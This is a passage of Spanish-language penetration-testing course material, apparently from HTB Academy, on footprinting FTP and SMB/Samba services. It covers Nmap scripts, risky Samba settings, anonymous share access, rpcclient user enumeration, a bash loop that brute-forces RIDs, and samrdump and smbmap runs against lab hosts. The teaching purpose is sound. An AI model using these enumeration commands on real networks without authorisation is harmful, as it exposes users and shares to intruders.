|_-rwxrwxrwx    1 ftp      ftp             0 Sep 15 14:57 testupload.txt [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
```

El escaneo de scripts predeterminado se basa en las huellas dactilares, las respuestas y los puertos estándar de los servicios. Una vez que Nmap ha detectado el servicio, ejecuta los scripts marcados uno tras otro, proporcionando información diferente. Por ejemplo, el [ftp-anón](https://nmap.org/nsedoc/scripts/ftp-anon.html) El script NSE comprueba si el servidor FTP permite el acceso anónimo. Si es así, el contenido del directorio raíz FTP se representa para el usuario anónimo.

El `ftp-syst`, por ejemplo, ejecuta el `STAT` comando, que muestra información sobre el estado del servidor FTP. Esto incluye configuraciones, así como la versión del servidor FTP. Nmap también proporciona la capacidad de rastrear el progreso de los scripts NSE a nivel de red si utilizamos el `--script-trace` opción en nuestros escaneos. Esto nos permite ver qué comandos envía Nmap, qué puertos se utilizan y qué respuestas recibimos del servidor escaneado.

#### Rastreo de script Nmap

  FTP

```shell-session
vcrdcr@htb[/htb]$ sudo nmap -sV -p21 -sC -A 10.129.14.136 --script-trace

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 13:54 CEST                                                                                                                                                   
NSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 8 [10.129.14.136:21]                                   
NSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 16 [10.129.14.136:21]             
NSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 24 [10.129.14.136:21]
NSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 32 [10.129.14.136:21]
NSOCK INFO [11.4640s] nsock_read(): Read request from IOD #1 [10.129.14.136:21] (timeout: 7000ms) EID 42
NSOCK INFO [11.4640s] nsock_read(): Read request from IOD #2 [10.129.14.136:21] (timeout: 9000ms) EID 50
NSOCK INFO [11.4640s] nsock_read(): Read request from IOD #3 [10.129.14.136:21] (timeout: 7000ms) EID 58
NSOCK INFO [11.4640s] nsock_read(): Read request from IOD #4 [10.129.14.136:21] (timeout: 11000ms) EID 66
NSE: TCP 10.10.14.4:54226 > 10.129.14.136:21 | CONNECT
NSE: TCP 10.10.14.4:54228 > 10.129.14.136:21 | CONNECT
NSE: TCP 10.10.14.4:54230 > 10.129.14.136:21 | CONNECT
NSE: TCP 10.10.14.4:54232 > 10.129.14.136:21 | CONNECT
NSOCK INFO [11.4660s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 50 [10.129.14.136:21] (41 bytes): 220 Welcome to HTB-Academy FTP service...
NSOCK INFO [11.4660s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 58 [10.129.14.136:21] (41 bytes): 220 Welcome to HTB-Academy FTP service...
NSE: TCP 10.10.14.4:54228 < 10.129.14.136:21 | 220 Welcome to HTB-Academy FTP service.
```

El historial de escaneo muestra que cuatro escaneos paralelos diferentes se ejecutan en contra del servicio, con varios tiempos de espera. Para los scripts NSE, vemos que nuestra máquina local utiliza otros puertos de salida (`54226`, `54228`, `54230`, `54232`) y primero inicia la conexión con el `CONNECT` comando. Desde la primera respuesta del servidor, podemos ver que estamos recibiendo el banner del servidor a nuestro segundo script NSE (`54228`) desde el servidor FTP de destino. Si es necesario, podemos, por supuesto, utilizar otras aplicaciones como `netcat` o `telnet` para interactuar con el servidor FTP.

#### Interacción de Servicio

  FTP

```shell-session
vcrdcr@htb[/htb]$ nc -nv 10.129.14.136 21
```

  FTP

```shell-session
vcrdcr@htb[/htb]$ telnet 10.129.14.136 21
```

Se ve ligeramente diferente si el servidor FTP se ejecuta con cifrado TLS/SSL. Porque entonces necesitamos un cliente que pueda manejar TLS/SSL. Para ello, podemos utilizar el cliente `openssl` y comunicarse con el servidor FTP. Lo bueno de usar `openssl` es que podemos ver el certificado SSL, que también puede ser útil.

  FTP

```shell-session
vcrdcr@htb[/htb]$ openssl s_client -connect 10.129.14.136:21 -starttls ftp

CONNECTED(00000003)                                                                                      
Can't use SSL_get_servername                        
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
verify error:num=18:self signed certificate
verify return:1

depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
verify return:1
---                                                 
Certificate chain
 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
 
 i:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
---
 
Server certificate

-----BEGIN CERTIFICATE-----

MIIENTCCAx2gAwIBAgIUD+SlFZAWzX5yLs2q3ZcfdsRQqMYwDQYJKoZIhvcNAQEL
...SNIP...
```

Esto se debe a que el certificado SSL nos permite reconocer el `hostname`, por ejemplo, y en la mayoría de los casos también un `email address` para la organización o empresa. Además, si la compañía tiene varias ubicaciones en todo el mundo, también se pueden crear certificados para ubicaciones específicas, que también se pueden identificar utilizando el certificado SSL.


# SMB

---

`Server Message Block` (`SMB`) es un protocolo cliente-servidor que regula el acceso a archivos y directorios completos y otros recursos de red, como impresoras, enrutadores o interfaces lanzados para la red. El intercambio de información entre diferentes procesos del sistema también se puede manejar en función del protocolo SMB. [SMB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/f210069c-7086-4dc2-885e-861d837df688)primero estuvo disponible para un público más amplio, por ejemplo, como parte del sistema operativo de red OS/2 LAN Manager y LAN Server. Desde entonces, el principal área de aplicación del protocolo ha sido la serie de sistemas operativos Windows en particular, cuyos servicios de red admiten SMB de una manera compatible con versiones anteriores, lo que significa que los dispositivos con ediciones más nuevas pueden comunicarse fácilmente con dispositivos que tienen un sistema operativo Microsoft más antiguo instalado. Con el proyecto de software libre Samba, también hay una solución que permite el uso de SMB en distribuciones Linux y Unix y, por lo tanto, la comunicación multiplataforma a través de SMB.

El protocolo SMB permite al cliente comunicarse con otros participantes de la misma red para acceder a archivos o servicios compartidos con él en la red. El otro sistema también debe haber implementado el protocolo de red y recibido y procesado la solicitud del cliente utilizando una aplicación de servidor SMB. Antes de eso, sin embargo, ambas partes deben establecer una conexión, por lo que primero intercambian los mensajes correspondientes.

En las redes IP, SMB utiliza el protocolo TCP para este propósito, que proporciona un apretón de manos de tres vías entre el cliente y el servidor antes de que finalmente se establezca una conexión. Las especificaciones del protocolo TCP también rigen el posterior transporte de datos. Podemos echar un vistazo a algunos ejemplos [aquí](https://web.archive.org/web/20240815212710/https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-SMB2/%5BMS-SMB2%5D.pdf#%5B%7B%22num%22%3A920%2C%22gen%22%3A0%7D%2C%7B%22name%22%3A%22XYZ%22%7D%2C69%2C738%2C0%5D).

Un servidor SMB puede proporcionar partes arbitrarias de su sistema de archivos local como acciones. Por lo tanto, la jerarquía visible para un cliente es parcialmente independiente de la estructura en el servidor. Los derechos de acceso están definidos por `Access Control Lists` (`ACL`). Se pueden controlar de una manera de grano fino en función de atributos como `execute`, `read`, y `full access` para usuarios individuales o grupos de usuarios. Las ACL se definen en función de las acciones y, por lo tanto, no corresponden a los derechos asignados localmente en el servidor.

---

## Samba

Como se mencionó anteriormente, existe una implementación alternativa del servidor SMB llamado Samba, que se desarrolla para sistemas operativos basados en Unix. Samba implementa el Sistema Común de Archivos de Internet (`CIFS`) protocolo de red. [CIF](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cifs/934c2faa-54af-4526-ac74-6a24d126724e) es un dialecto de SMB, lo que significa que es una implementación específica del protocolo SMB creado originalmente por Microsoft. Esto permite que Samba se comunique de manera efectiva con los sistemas Windows más nuevos. Por lo tanto, a menudo se le conoce como SMB/CIFS.

Sin embargo, `CIFS` se considera una versión específica del protocolo SMB, que se alinea principalmente con `SMB version 1`. Cuando los comandos SMB se transmiten a través de Samba a un servicio NetBIOS más antiguo, las conexiones generalmente ocurren a través de puertos TCP `137`, `138`, y `139`. En contraste, CIFS opera sobre el puerto TCP `445` exclusivamente. Hay varias versiones de SMB, incluyendo versiones más nuevas como `SMB 2` y `SMB 3`, que ofrecen mejoras y se prefieren en las infraestructuras modernas, mientras que las versiones anteriores como `SMB 1` (`CIFS`) se consideran obsoletos, pero aún se pueden usar en entornos específicos.

|**Versión SMB**|**Apoyado**|**Características**|
|---|---|---|
|CIF|Windows NT 4,0|Comunicación a través de la interfaz NetBIOS|
|SMB 1.0|Windows 2000|Conexión directa a través de TCP|
|SMB 2.0|Windows Vista, Windows Server 2008|Actualizaciones de rendimiento, firma de mensajes mejorada, función de almacenamiento en caché|
|PYME 2.1|Windows 7, Windows Server 2008 R2|Mecanismos de bloqueo|
|SMB 3.0|Windows 8, Windows Server 2012|Conexiones multicanal, cifrado de extremo a extremo, acceso de almacenamiento remoto|
|PYMES 3.0.2|Windows 8.1, Windows Server 2012 R2||
|PYME 3.1.1|Windows 10, Windows Server 2016|Comprobación de integridad, cifrado AES-128|

Con la versión 3, el servidor Samba obtuvo la capacidad de ser miembro de pleno derecho de un dominio de Active Directory. Con la versión 4, Samba incluso proporciona un controlador de dominio de Active Directory. Contiene varios de los llamados demonios para este propósito, que son programas de fondo de Unix. El demonio del servidor SMB (`smbd`) perteneciente a Samba proporciona las dos primeras funcionalidades, mientras que el demonio de bloque de mensajes NetBIOS (`nmbd`) implementa las dos últimas funcionalidades. El servicio SMB controla estos dos programas de fondo.

Sabemos que Samba es adecuado tanto para sistemas Linux como Windows. En una red, cada host participa en la misma `workgroup`. Un grupo de trabajo es un nombre de grupo que identifica una colección arbitraria de computadoras y sus recursos en una red SMB. Puede haber múltiples grupos de trabajo en la red en un momento dado. IBM desarrolló un `application programming interface` (`API`) para computadoras de red llamadas el `Network Basic Input/Output System` (`NetBIOS`). La API de NetBIOS proporcionó un plan para que una aplicación se conecte y comparta datos con otras computadoras. En un entorno NetBIOS, cuando una máquina se conecta, necesita un nombre, que se realiza a través de los llamados `name registration` procedimiento. O cada host reserva su nombre de host en la red, o el [Servidor de nombres NetBIOS](https://networkencyclopedia.com/netbios-name-server-nbns/) (`NBNS`) se utiliza para este propósito. También se ha mejorado para [Servicio de nombres de Internet de Windows](https://networkencyclopedia.com/windows-internet-name-service-wins/) (`WINS`).

---

## Configuración Predeterminada

Como podemos imaginar, Samba ofrece una amplia gama de [configuración](https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html) que podemos configurar. Una vez más, definimos la configuración a través de un archivo de texto donde podemos obtener una visión general de algunas de las configuraciones. Estas configuraciones se ven como las siguientes cuando se filtran:

#### Configuración Predeterminada

  SMB

```shell-session
vcrdcr@htb[/htb]$ cat /etc/samba/smb.conf | grep -v "#\|\;" 

[global]
   workgroup = DEV.INFREIGHT.HTB
   server string = DEVSMB
   log file = /var/log/samba/log.%m
   max log size = 1000
   logging = file
   panic action = /usr/share/samba/panic-action %d

   server role = standalone server
   obey pam restrictions = yes
   unix password sync = yes

   passwd program = /usr/bin/passwd %u
   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .

   pam password change = yes
   map to guest = bad user
   usershare allow guests = yes

[printers]
   comment = All Printers
   browseable = no
   path = /var/spool/samba
   printable = yes
   guest ok = no
   read only = yes
   create mask = 0700

[print$]
   comment = Printer Drivers
   path = /var/lib/samba/printers
   browseable = yes
   read only = yes
   guest ok = no
```

Vemos configuraciones globales y dos acciones destinadas a impresoras. La configuración global es la configuración del servidor SMB disponible que se utiliza para todas las acciones. En las acciones individuales, sin embargo, la configuración global se puede sobrescribir, que se puede configurar con alta probabilidad incluso incorrectamente. Veamos algunas de las configuraciones para comprender cómo se configuran las acciones en Samba.

|**Configuración**|**Descripción**|
|---|---|
|`[sharename]`|El nombre del recurso compartido de red.|
|`workgroup = WORKGROUP/DOMAIN`|Grupo de trabajo que aparecerá cuando los clientes consulten.|
|`path = /path/here/`|El directorio al que se le dará acceso al usuario.|
|`server string = STRING`|La cadena que aparecerá cuando se inicie una conexión.|
|`unix password sync = yes`|¿Sincronizar la contraseña UNIX con la contraseña SMB?|
|`usershare allow guests = yes`|¿Permitir que los usuarios no autenticados accedan a acciones definidas?|
|`map to guest = bad user`|¿Qué hacer cuando una solicitud de inicio de sesión de usuario no coincide con un usuario UNIX válido?|
|`browseable = yes`|¿Debería mostrarse esta acción en la lista de acciones disponibles?|
|`guest ok = yes`|¿Permitir conectarse al servicio sin usar una contraseña?|
|`read only = yes`|¿Permitir a los usuarios leer solo archivos?|
|`create mask = 0700`|¿Qué permisos deben establecerse para los archivos recién creados?|

---

## Configuración Peligrosa

Algunas de las configuraciones anteriores ya traen algunas opciones sensibles. Sin embargo, supongamos que cuestionamos la configuración que se enumera a continuación y nos preguntamos qué podrían obtener los empleados de ellos, así como los atacantes. En ese caso, veremos qué ventajas y desventajas trae la configuración con ellos. Tomemos el escenario `browseable = yes` como ejemplo. Si nosotros, como administradores, adoptamos esta configuración, los empleados de la compañía tendrán la comodidad de poder mirar las carpetas individuales con el contenido. Muchas carpetas se utilizan eventualmente para una mejor organización y estructura. Si el empleado puede navegar a través de las acciones, el atacante también podrá hacerlo después de un acceso exitoso.

|**Configuración**|**Descripción**|
|---|---|
|`browseable = yes`|¿Permitir enumerar las acciones disponibles en la acción actual?|
|`read only = no`|¿Olvidó la creación y modificación de archivos?|
|`writable = yes`|¿Permitir a los usuarios crear y modificar archivos?|
|`guest ok = yes`|¿Permitir conectarse al servicio sin usar una contraseña?|
|`enable privileges = yes`|¿Privilegios de honor asignados a SID específicos?|
|`create mask = 0777`|¿Qué permisos se deben asignar a los archivos recién creados?|
|`directory mask = 0777`|¿Qué permisos se deben asignar a los directorios recién creados?|
|`logon script = script.sh`|¿Qué script debe ejecutarse en el inicio de sesión del usuario?|
|`magic script = script.sh`|¿Qué script debe ejecutarse cuando se cierra el script?|
|`magic output = script.out`|¿Dónde se debe almacenar la salida del script mágico?|

Creemos una acción llamada `[notes]` y algunos otros y vea cómo la configuración afecta nuestro proceso de enumeración. Utilizaremos todas las configuraciones anteriores y las aplicaremos a esta acción. Por ejemplo, esta configuración se aplica a menudo, aunque solo sea con fines de prueba. Si se trata de una subred interna de un equipo pequeño en un departamento grande, esta configuración a menudo se conserva u olvida para restablecerse. Esto lleva al hecho de que podemos navegar a través de todas las acciones y, con alta probabilidad, incluso descargarlas e inspeccionarlas.

#### Ejemplo Compartir

  SMB

```shell-session
...SNIP...

[notes]
	comment = CheckIT
	path = /mnt/notes/

	browseable = yes
	read only = no
	writable = yes
	guest ok = yes

	enable privileges = yes
	create mask = 0777
	directory mask = 0777
```

Es muy recomendable mirar las páginas de manual para Samba y configurarlo nosotros mismos y experimentar con la configuración. Luego descubriremos aspectos potenciales que serán interesantes para nosotros como probador de penetración. Además, cuanto más familiarizados estemos con el servidor Samba y SMB, más fácil será encontrar nuestro camino alrededor del medio ambiente y usarlo para nuestros propósitos. Una vez que nos hayamos ajustado `/etc/samba/smb.conf` para nuestras necesidades, tenemos que reiniciar el servicio en el servidor.

#### Reiniciar Samba

  SMB

```shell-session
root@samba:~# sudo systemctl restart smbd
```

Ahora podemos mostrar una lista (`-L`) de las acciones del servidor con el `smbclient` comando de nuestro anfitrión. Usamos los llamados `null session` (`-N`), que es `anonymous` acceso sin la entrada de usuarios existentes o contraseñas válidas.

#### SMBclient - Conexión a la Compartir

  SMB

```shell-session
vcrdcr@htb[/htb]$ smbclient -N -L //10.129.14.128

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        home            Disk      INFREIGHT Samba
        dev             Disk      DEVenv
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled -- no workgroup available
```

Podemos ver que ahora tenemos cinco acciones diferentes en el servidor de Samba del resultado. De ahí `print$` y un `IPC$` ya están incluidos de forma predeterminada en la configuración básica, como ya hemos visto. Ya que tratamos con el `[notes]` comparta, permítanos iniciar sesión e inspeccionarlo utilizando el mismo programa de cliente. Si no estamos familiarizados con el programa del cliente, podemos utilizar el `help` comando en inicio de sesión exitoso, enumerando todos los comandos posibles que podemos ejecutar.

  SMB

```shell-session
vcrdcr@htb[/htb]$ smbclient //10.129.14.128/notes

Enter WORKGROUP\<username>'s password: 
Anonymous login successful
Try "help" to get a list of possible commands.


smb: \> help

?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!            


smb: \> ls

  .                                   D        0  Wed Sep 22 18:17:51 2021
  ..                                  D        0  Wed Sep 22 12:03:59 2021
  prep-prod.txt                       N       71  Sun Sep 19 15:45:21 2021

                30313412 blocks of size 1024. 16480084 blocks available
```

Una vez que hayamos descubierto archivos o carpetas interesantes, podemos descargarlos utilizando el `get` comando. Smbclient también nos permite ejecutar comandos del sistema local utilizando un signo de exclamación al principio (`!<cmd>`) sin interrumpir la conexión.

#### Descargar Archivos de SMB

  SMB

```shell-session
smb: \> get prep-prod.txt 

getting file \prep-prod.txt of size 71 as prep-prod.txt (8,7 KiloBytes/sec) 
(average 8,7 KiloBytes/sec)


smb: \> !ls

prep-prod.txt


smb: \> !cat prep-prod.txt

[] check your code with the templates
[] run code-assessment.py
[] …	
```

Desde el punto de vista administrativo, podemos comprobar estas conexiones utilizando `smbstatus`. Aparte de la versión Samba, también podemos ver quién, desde qué host, y cuáles comparten el cliente está conectado. Esto es especialmente importante una vez que hemos entrado en una subred (quizás incluso una aislada) a la que los demás aún pueden acceder.

Por ejemplo, con la seguridad a nivel de dominio, el servidor de samba actúa como miembro de un dominio de Windows. Cada dominio tiene al menos un controlador de dominio, generalmente un servidor Windows NT que proporciona autenticación de contraseña. Este controlador de dominio proporciona al grupo de trabajo un servidor de contraseñas definitivo. Los controladores de dominio realizan un seguimiento de los usuarios y las contraseñas por su cuenta `NTDS.dit` y `Security Authentication Module` (`SAM`) y autenticar a cada usuario cuando inicie sesión por primera vez y desee acceder a la participación de otra máquina.

#### Estado de Samba

  SMB

```shell-session
root@samba:~# smbstatus

Samba version 4.11.6-Ubuntu
PID     Username     Group        Machine                                   Protocol Version  Encryption           Signing              
----------------------------------------------------------------------------------------------------------------------------------------
75691   sambauser    samba        10.10.14.4 (ipv4:10.10.14.4:45564)      SMB3_11           -                    -                    

Service      pid     Machine       Connected at                     Encryption   Signing     
---------------------------------------------------------------------------------------------
notes        75691   10.10.14.4   Do Sep 23 00:12:06 2021 CEST     -            -           

No locked files
```

---

## Huella del Servicio

Volvamos a una de nuestras herramientas de enumeración. Nmap también tiene muchas opciones y scripts NSE que pueden ayudarnos a examinar el servicio SMB del objetivo más de cerca y obtener más información. La desventaja, sin embargo, es que estos escaneos pueden llevar mucho tiempo. Por lo tanto, también se recomienda mirar el servicio manualmente, principalmente porque podemos encontrar muchos más detalles de los que Nmap podría mostrarnos. Primero, sin embargo, veamos qué puede encontrar Nmap en nuestro servidor de Samba objetivo, donde creamos el `[notes]` compartir con fines de prueba.

#### Mapa

  SMB

```shell-session
vcrdcr@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
Nmap scan report for sharing.inlanefreight.htb (10.129.14.128)
Host is up (0.00024s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 00:00:00:00:00:00 (VMware)

Host script results:
|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-19T13:16:04
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.35 seconds
```

Podemos ver en los resultados que no es mucho lo que Nmap nos proporcionó aquí. Por lo tanto, debemos recurrir a otras herramientas que nos permitan interactuar manualmente con la SMB y enviar solicitudes específicas para la información. Una de las herramientas útiles para esto es `rpcclient`. Esta es una herramienta para realizar funciones de MS-RPC.

El [Llamada de Procedimiento Remoto](https://www.geeksforgeeks.org/remote-procedure-call-rpc-in-operating-system/) (`RPC`) es un concepto y, por lo tanto, también una herramienta central para realizar estructuras operativas y de intercambio de trabajo en redes y arquitecturas cliente-servidor. El proceso de comunicación a través de RPC incluye parámetros de paso y el retorno de un valor de función.

#### RPCcliente

  SMB

```shell-session
vcrdcr@htb[/htb]$ rpcclient -U "" 10.129.14.128

Enter WORKGROUP\'s password:
rpcclient $> 
```

El `rpcclient` nos ofrece muchas solicitudes diferentes con las que podemos ejecutar funciones específicas en el servidor SMB para obtener información. Una lista completa de todas estas funciones se puede encontrar en el [página de manual](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) del rpcclient.

|**Consulta**|**Descripción**|
|---|---|
|`srvinfo`|Información del servidor.|
|`enumdomains`|Enumerar todos los dominios que se implementan en la red.|
|`querydominfo`|Proporciona información de dominio, servidor y usuario de los dominios implementados.|
|`netshareenumall`|Enumera todas las acciones disponibles.|
|`netsharegetinfo <share>`|Proporciona información sobre un recurso compartido específico.|
|`enumdomusers`|Enumera a todos los usuarios de dominio.|
|`queryuser <RID>`|Proporciona información sobre un usuario específico.|

#### RPCclient - Enumeración

  SMB

```shell-session
rpcclient $> srvinfo

        DEVSMB         Wk Sv PrQ Unx NT SNT DEVSM
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03
		
		
rpcclient $> enumdomains

name:[DEVSMB] idx:[0x0]
name:[Builtin] idx:[0x1]


rpcclient $> querydominfo

Domain:         DEVOPS
Server:         DEVSMB
Comment:        DEVSM
Total Users:    2
Total Groups:   0
Total Aliases:  0
Sequence No:    1632361158
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1


rpcclient $> netshareenumall

netname: print$
        remark: Printer Drivers
        path:   C:\var\lib\samba\printers
        password:
netname: home
        remark: INFREIGHT Samba
        path:   C:\home\
        password:
netname: dev
        remark: DEVenv
        path:   C:\home\sambauser\dev\
        password:
netname: notes
        remark: CheckIT
        path:   C:\mnt\notes\
        password:
netname: IPC$
        remark: IPC Service (DEVSM)
        path:   C:\tmp
        password:
		
		
rpcclient $> netsharegetinfo notes

netname: notes
        remark: CheckIT
        path:   C:\mnt\notes\
        password:
        type:   0x0
        perms:  0
        max_uses:       -1
        num_uses:       1
revision: 1
type: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE 
DACL
        ACL     Num ACEs:       1       revision:       2
        ---
        ACE
                type: ACCESS ALLOWED (0) flags: 0x00 
                Specific bits: 0x1ff
                Permissions: 0x101f01ff: Generic all access SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS 
                SID: S-1-1-0
```

Estos ejemplos nos muestran qué información se puede filtrar a usuarios anónimos. Una vez `anonymous` el usuario tiene acceso a un servicio de red, solo se necesita un error para darles demasiados permisos o demasiada visibilidad para poner a toda la red en un riesgo significativo.

Lo más importante es que el acceso anónimo a dichos servicios también puede conducir al descubrimiento de otros usuarios, que pueden ser atacados con fuerza bruta en el caso más agresivo. Los humanos son más propensos a errores que los procesos informáticos configurados correctamente, y la falta de conciencia de seguridad y pereza a menudo conduce a contraseñas débiles que se pueden descifrar fácilmente. Veamos cómo podemos enumerar a los usuarios que usan el `rpcclient`.

#### Rpcclient - Enumeración de Usuario

  SMB

```shell-session
rpcclient $> enumdomusers

user:[mrb3n] rid:[0x3e8]
user:[cry0l1t3] rid:[0x3e9]


rpcclient $> queryuser 0x3e9

        User Name   :   cry0l1t3
        Full Name   :   cry0l1t3
        Home Drive  :   \\devsmb\cry0l1t3
        Dir Drive   :
        Profile Path:   \\devsmb\cry0l1t3\profile
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Do, 01 Jan 1970 01:00:00 CET
        Logoff Time              :      Mi, 06 Feb 2036 16:06:39 CET
        Kickoff Time             :      Mi, 06 Feb 2036 16:06:39 CET
        Password last set Time   :      Mi, 22 Sep 2021 17:50:56 CEST
        Password can change Time :      Mi, 22 Sep 2021 17:50:56 CEST
        Password must change Time:      Do, 14 Sep 30828 04:48:05 CEST
        unknown_2[0..31]...
        user_rid :      0x3e9
        group_rid:      0x201
        acb_info :      0x00000014
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...


rpcclient $> queryuser 0x3e8

        User Name   :   mrb3n
        Full Name   :
        Home Drive  :   \\devsmb\mrb3n
        Dir Drive   :
        Profile Path:   \\devsmb\mrb3n\profile
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Do, 01 Jan 1970 01:00:00 CET
        Logoff Time              :      Mi, 06 Feb 2036 16:06:39 CET
        Kickoff Time             :      Mi, 06 Feb 2036 16:06:39 CET
        Password last set Time   :      Mi, 22 Sep 2021 17:47:59 CEST
        Password can change Time :      Mi, 22 Sep 2021 17:47:59 CEST
        Password must change Time:      Do, 14 Sep 30828 04:48:05 CEST
        unknown_2[0..31]...
        user_rid :      0x3e8
        group_rid:      0x201
        acb_info :      0x00000010
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...
```

Luego podemos usar los resultados para identificar el RID del grupo, que luego podemos usar para recuperar información de todo el grupo.

#### Rpcclient - Información del Grupo

  SMB

```shell-session
rpcclient $> querygroup 0x201

        Group Name:     None
        Description:    Ordinary Users
        Group Attribute:7
        Num Members:2
```

Sin embargo, también puede suceder que no todos los comandos estén disponibles para nosotros, y tenemos ciertas restricciones basadas en el usuario. Sin embargo, la consulta `queryuser <RID>` se permite principalmente en función del RID. Así que podemos usar el rpcclient para forzar brutamente los RID para obtener información. Debido a que es posible que no sepamos a quién se le ha asignado qué RID, sabemos que obtendremos información al respecto tan pronto como consultamos un RID asignado. Hay varias formas y herramientas que podemos usar para esto. Para permanecer con la herramienta, podemos crear un `For-loop` usando `Bash` donde enviamos un comando al servicio usando rpcclient y filtramos los resultados.

#### Brute Forcing Usuario RID

  SMB

```shell-session
vcrdcr@htb[/htb]$ for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

        User Name   :   sambauser
        user_rid :      0x1f5
        group_rid:      0x201
		
        User Name   :   mrb3n
        user_rid :      0x3e8
        group_rid:      0x201
		
        User Name   :   cry0l1t3
        user_rid :      0x3e9
        group_rid:      0x201
```

Una alternativa a esto sería un script de Python de [Impactar](https://github.com/SecureAuthCorp/impacket) llamado [samrdump.p](https://github.com/SecureAuthCorp/impacket/blob/master/examples/samrdump.py).

#### Impactado - Samrdump.py

  SMB

```shell-session
vcrdcr@htb[/htb]$ samrdump.py 10.129.14.128

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Retrieving endpoint list from 10.129.14.128
Found domain(s):
 . DEVSMB
 . Builtin
[*] Looking up users in domain DEVSMB
Found user: mrb3n, uid = 1000
Found user: cry0l1t3, uid = 1001
mrb3n (1000)/FullName: 
mrb3n (1000)/UserComment: 
mrb3n (1000)/PrimaryGroupId: 513
mrb3n (1000)/BadPasswordCount: 0
mrb3n (1000)/LogonCount: 0
mrb3n (1000)/PasswordLastSet: 2021-09-22 17:47:59
mrb3n (1000)/PasswordDoesNotExpire: False
mrb3n (1000)/AccountIsDisabled: False
mrb3n (1000)/ScriptPath: 
cry0l1t3 (1001)/FullName: cry0l1t3
cry0l1t3 (1001)/UserComment: 
cry0l1t3 (1001)/PrimaryGroupId: 513
cry0l1t3 (1001)/BadPasswordCount: 0
cry0l1t3 (1001)/LogonCount: 0
cry0l1t3 (1001)/PasswordLastSet: 2021-09-22 17:50:56
cry0l1t3 (1001)/PasswordDoesNotExpire: False
cry0l1t3 (1001)/AccountIsDisabled: False
cry0l1t3 (1001)/ScriptPath: 
[*] Received 2 entries.
```

La información que ya hemos obtenido con `rpcclient` también se puede obtener utilizando otras herramientas. Por ejemplo, el [SMBMap](https://github.com/ShawnDEvans/smbmap) y [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) las herramientas también son ampliamente utilizadas y útiles para la enumeración de servicios de SMB.

#### SMBmapa

  SMB

```shell-session
vcrdcr@htb[/htb]$ smbmap -H 10.129.14.128

[+] Finding open SMB ports....
[+] User SMB session established on 10.129.14.128...
[+] IP: 10.129.14.128:445       Name: 10.129.14.128                                     
        Disk                                                    Permissions     Comment
